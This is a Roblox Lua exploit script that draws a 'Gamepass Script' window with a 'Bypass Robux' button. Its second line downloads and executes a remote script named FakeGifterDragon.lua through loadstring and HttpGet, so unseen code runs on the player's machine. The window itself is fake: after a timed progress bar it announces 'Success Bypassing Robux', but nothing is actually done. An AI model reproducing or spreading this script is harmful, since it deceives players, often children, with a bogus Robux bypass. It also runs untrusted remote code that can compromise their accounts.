getgenv().robux = 1880000
loadstring(game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/pro/refs/heads/main/FakeGifterDragon.lua"))()
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")

-- ScreenGui
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "GamepassScriptUI"
ScreenGui.Parent = game:GetService("CoreGui")
ScreenGui.ResetOnSpawn = false

-- Main Frame
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 260, 0, 160)
MainFrame.Position = UDim2.new(0.5, -130, 0.5, -80)
MainFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 18) -- Black UI
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Parent = ScreenGui

local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 12)
MainCorner.Parent = MainFrame

-- Flash Effect Frame
local FlashOverlay = Instance.new("Frame")
FlashOverlay.Name = "FlashOverlay"
FlashOverlay.Size = UDim2.new(1, 0, 1, 0)
FlashOverlay.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
FlashOverlay.BackgroundTransparency = 1
FlashOverlay.BorderSizePixel = 0
FlashOverlay.ZIndex = 10
FlashOverlay.Parent = MainFrame

local FlashCorner = Instance.new("UICorner")
FlashCorner.CornerRadius = UDim.new(0, 12)
FlashCorner.Parent = FlashOverlay

-- Title Bar
local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1, 0, 0, 40)
TitleBar.BackgroundTransparency = 1
TitleBar.Parent = MainFrame

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 1, 0)
Title.Position = UDim2.new(0, 0, 0, 4) -- Lowered a bit
Title.BackgroundTransparency = 1
Title.Text = "✨ GAMEPASS SCRIPT"
Title.TextColor3 = Color3.fromRGB(255, 215, 0) -- Gold
Title.Font = Enum.Font.GothamBold
Title.TextSize = 18 -- Bigger
Title.Parent = TitleBar

-- Dark Clickable Panel (Robux Bypass)
local RollbackPanel = Instance.new("TextButton")
RollbackPanel.Size = UDim2.new(1, -16, 0, 54)
RollbackPanel.Position = UDim2.new(0, 8, 0, 48)
RollbackPanel.BackgroundColor3 = Color3.fromRGB(35, 35, 35) -- Dark gray (not too black)
RollbackPanel.BorderSizePixel = 0
RollbackPanel.Text = ""
RollbackPanel.Parent = MainFrame

local PanelCorner = Instance.new("UICorner")
PanelCorner.CornerRadius = UDim.new(0, 10)
PanelCorner.Parent = RollbackPanel

local PanelTitle = Instance.new("TextLabel")
PanelTitle.Size = UDim2.new(1, 0, 1, 0)
PanelTitle.BackgroundTransparency = 1
PanelTitle.Text = "👀 Bypass Robux"
PanelTitle.TextColor3 = Color3.new(1, 1, 1)
PanelTitle.Font = Enum.Font.GothamBold
PanelTitle.TextSize = 18
PanelTitle.TextXAlignment = Enum.TextXAlignment.Center
PanelTitle.Parent = RollbackPanel

-- Progress Bar
local ProgressBarBG = Instance.new("Frame")
ProgressBarBG.Name = "ProgressBG"
ProgressBarBG.Size = UDim2.new(1, -20, 0, 12)
ProgressBarBG.Position = UDim2.new(0, 10, 0, 112)
ProgressBarBG.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
ProgressBarBG.BorderSizePixel = 0
ProgressBarBG.Visible = false
ProgressBarBG.Parent = MainFrame

local BGCorner = Instance.new("UICorner")
BGCorner.CornerRadius = UDim.new(0, 6)
BGCorner.Parent = ProgressBarBG

local ProgressBar = Instance.new("Frame")
ProgressBar.Name = "Progress"
ProgressBar.Size = UDim2.new(0, 0, 1, 0)
ProgressBar.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
ProgressBar.BorderSizePixel = 0
ProgressBar.Parent = ProgressBarBG

local ProgressCorner = Instance.new("UICorner")
ProgressCorner.CornerRadius = UDim.new(0, 6)
ProgressCorner.Parent = ProgressBar

-- Credits
local Credits = Instance.new("TextLabel")
Credits.Size = UDim2.new(1, 0, 0, 18)
Credits.Position = UDim2.new(0, 0, 0, 136)
Credits.BackgroundTransparency = 1
Credits.Text = "Made by Mochii Scripts"
Credits.TextColor3 = Color3.fromRGB(180, 180, 180)
Credits.Font = Enum.Font.Gotham
Credits.TextSize = 12
Credits.TextXAlignment = Enum.TextXAlignment.Center
Credits.Parent = MainFrame

-- Success Message
local SuccessLabel = Instance.new("TextLabel")
SuccessLabel.Size = UDim2.new(1, -20, 0, 30)
SuccessLabel.Position = UDim2.new(0, 10, 0, 102)
SuccessLabel.BackgroundTransparency = 1
SuccessLabel.Text = "✅ Success Bypassing Robux"
SuccessLabel.TextColor3 = Color3.fromRGB(0, 255, 100)
SuccessLabel.Font = Enum.Font.GothamBold
SuccessLabel.TextSize = 14
SuccessLabel.TextStrokeTransparency = 0.7
SuccessLabel.Visible = false
SuccessLabel.Parent = MainFrame

local SuccessCorner = Instance.new("UICorner")
SuccessCorner.CornerRadius = UDim.new(0, 8)
SuccessCorner.Parent = SuccessLabel

-- Flash Function
local function FlashUI()
	FlashOverlay.BackgroundTransparency = 0.3
	TweenService:Create(
		FlashOverlay,
		TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
		{BackgroundTransparency = 1}
	):Play()
end

-- Click Function
local function OnRollbackClick()
	if ProgressBarBG.Visible then return end
	
	SuccessLabel.Visible = false
	ProgressBarBG.Visible = true
	ProgressBar.Size = UDim2.new(0, 0, 1, 0)
	ProgressBar.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
	
	-- 10 Second Loading
	local tween = TweenService:Create(
		ProgressBar,
		TweenInfo.new(10, Enum.EasingStyle.Linear),
		{Size = UDim2.new(1, 0, 1, 0)}
	)
	tween:Play()
	
	task.delay(10, function()
		ProgressBar.BackgroundColor3 = Color3.fromRGB(0, 255, 80)
		
		ProgressBarBG.Visible = false
		SuccessLabel.Visible = true
		
		task.delay(4, function()
			SuccessLabel.Visible = false
			FlashUI()
		end)
	end)
	
	-- ←←← ILAGAY MO DITO YUNG ROLLBACK SCRIPT MO ←←←
end

RollbackPanel.MouseButton1Click:Connect(OnRollbackClick)

-- Drag Functionality
local dragging = false
local dragInput
local dragStart
local startPos

local function update(input)
	local delta = input.Position - dragStart
	MainFrame.Position = UDim2.new(
		startPos.X.Scale,
		startPos.X.Offset + delta.X,
		startPos.Y.Scale,
		startPos.Y.Offset + delta.Y
	)
end

TitleBar.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = MainFrame.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

TitleBar.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if dragging and input == dragInput then
		update(input)
	end
end)